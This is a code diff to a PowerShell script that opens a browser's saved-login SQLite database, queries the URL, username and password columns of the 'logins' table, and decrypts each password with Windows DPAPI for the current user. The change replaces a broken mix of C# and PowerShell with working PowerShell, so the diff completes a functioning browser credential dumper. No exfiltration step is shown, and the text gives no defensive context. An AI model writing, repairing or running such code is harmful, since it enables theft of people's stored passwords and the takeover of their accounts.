@@ -75,40 +75,25 @@ $SQLiteInteropPath = "$([system.io.path]::GetTempPath())SQLite.Interop.dll"
 
 [System.Reflection.Assembly]::LoadFile($SQLitePath) | Out-Null
 $conn = New-Object System.Data.Sqlite.SqliteConnection -ArgumentList "Data Source=$Path;"
-#$conn.Open()
-#$command = New-Object System.Data.SQLite.SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", $conn)
-#$reader = $command.ExecuteReader()
-#$conn.Close()
+$conn.Open()
 
+$command = New-Object System.Data.SQLite.SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", $conn)
+$reader = $command.ExecuteReader()
 
-
-using (SQLiteConnection c = new SQLiteConnection($conn))
+while ($reader.Read())
 {
-    c.Open();
-    using (SQLiteCommand cmd = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", $conn))
-    {
-        using (SQLiteDataReader rdr = cmd.ExecuteReader())
-        {
-            
-			while ($reader.Read())
-			{
-				$record = New-Object psobject
-				$record | select @{N='Url';E={$reader["action_url"]};},
-									@{N='Username';E={$reader["username_value"]};},
-									@{N='Password';`
-										E={
-											[System.Text.Encoding]::Default.GetString(
-												[System.Security.Cryptography.ProtectedData]::Unprotect(
-																$reader["password_value"],
-																$null, 
-																[System.Security.Cryptography.DataProtectionScope]::CurrentUser
-												)
-											)
-										};
-									 }
-			}
-
-
-        }
-    }
+    $record = New-Object psobject
+    $record | select @{N='Url';E={$reader["action_url"]};},
+                        @{N='Username';E={$reader["username_value"]};},
+                        @{N='Password';`
+                            E={
+                                [System.Text.Encoding]::Default.GetString(
+                                    [System.Security.Cryptography.ProtectedData]::Unprotect(
+                                                    $reader["password_value"],
+                                                    $null, 
+                                                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+                                    )
+                                )
+                            };
+                         }
 }
